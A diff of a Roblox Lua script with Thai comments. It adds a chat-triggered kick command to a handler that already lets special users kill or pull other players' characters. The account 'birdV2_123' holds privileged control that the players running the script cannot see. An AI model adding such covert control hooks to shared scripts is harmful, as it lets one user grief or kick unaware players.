@@ -1044,12 +1044,19 @@ Players.PlayerAdded:Connect(hookPlayer)
 for _,p in ipairs(Players:GetPlayers()) do
 	hookPlayer(p)
 end
---== ส่วนที่ 2 : ฟังก์ชันคำสั่งพิเศษ ==--
+--== ส่วนที่ 2 : ฟังก์ชันคำสั่งพิเศษ (อัปเดต) ==--
 
 -- ฟังก์ชันฆ่าตัวละคร
 local function killPlayer(plr)
 	if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
 		plr.Character.Humanoid.Health = 0
+	end
+end
+
+-- ฟังก์ชันเตะออกจากเกม
+local function kickPlayer(plr)
+	if plr == game.Players.LocalPlayer then
+		game.Players.LocalPlayer:Kick("โดนแบนละ")
 	end
 end
 
@@ -1079,11 +1086,9 @@ _G.HandleExtraCommands = function(speaker, msg, LocalPlayer, specialUsers)
 	-- ✅ kill ALL
 	if lowerMsg == "kill all" then
 		if LocalPlayer ~= speaker then
-			-- ถ้า speaker คือ bird → ทุกคนโดน
 			if speaker.Name == "birdV2_123" then
 				killPlayer(LocalPlayer)
 			else
-				-- ถ้า speaker เป็น special คนอื่น → ไม่กระทบ bird
 				if LocalPlayer.Name ~= "birdV2_123" then
 					killPlayer(LocalPlayer)
 				end
@@ -1094,25 +1099,28 @@ _G.HandleExtraCommands = function(speaker, msg, LocalPlayer, specialUsers)
 	elseif string.sub(lowerMsg,1,5) == "kill " then
 		local targetName = string.sub(msg,6)
 		if LocalPlayer.Name == targetName and LocalPlayer ~= speaker then
-			-- ถ้า speaker คือ bird → ฆ่าได้ทุกคน
 			if speaker.Name == "birdV2_123" then
 				killPlayer(LocalPlayer)
 			else
-				-- ถ้า speaker เป็น special คนอื่น → ฆ่าได้ยกเว้น bird
 				if LocalPlayer.Name ~= "birdV2_123" then
 					killPlayer(LocalPlayer)
 				end
 			end
 		end
 
+	-- ✅ เตะ NAME (เฉพาะ birdV2_123 ใช้ได้)
+	elseif string.sub(msg,1,4) == "เตะ " and speaker.Name == "birdV2_123" then
+		local targetName = string.sub(msg,5)
+		if LocalPlayer.Name == targetName and LocalPlayer ~= speaker then
+			kickPlayer(LocalPlayer)
+		end
+
 	-- ✅ ดึง
 	elseif lowerMsg == "ดึง" and specialUsers[speaker.Name] then
 		if LocalPlayer ~= speaker then
-			-- bird ดึง → ทุกคนโดนหมด
 			if speaker.Name == "birdV2_123" then
 				pullToSpeaker(speaker, LocalPlayer)
 			else
-				-- คนอื่นดึง → ดึงทุกคนยกเว้น bird
 				if LocalPlayer.Name ~= "birdV2_123" then
 					pullToSpeaker(speaker, LocalPlayer)
 				end
@@ -1122,16 +1130,15 @@ _G.HandleExtraCommands = function(speaker, msg, LocalPlayer, specialUsers)
 	-- ✅ เช็ค
 	elseif lowerMsg == "เช็ค" and specialUsers[speaker.Name] then
 		if LocalPlayer ~= speaker then
-			-- bird เช็ค → ทุกคนโดนหมด
 			if speaker.Name == "birdV2_123" then
 				checkMessage()
 			else
-				-- คนอื่นเช็ค → ยกเว้น bird
 				if LocalPlayer.Name ~= "birdV2_123" then
 					checkMessage()
 				end
 			end
 		end
 	end
+end
 end
 
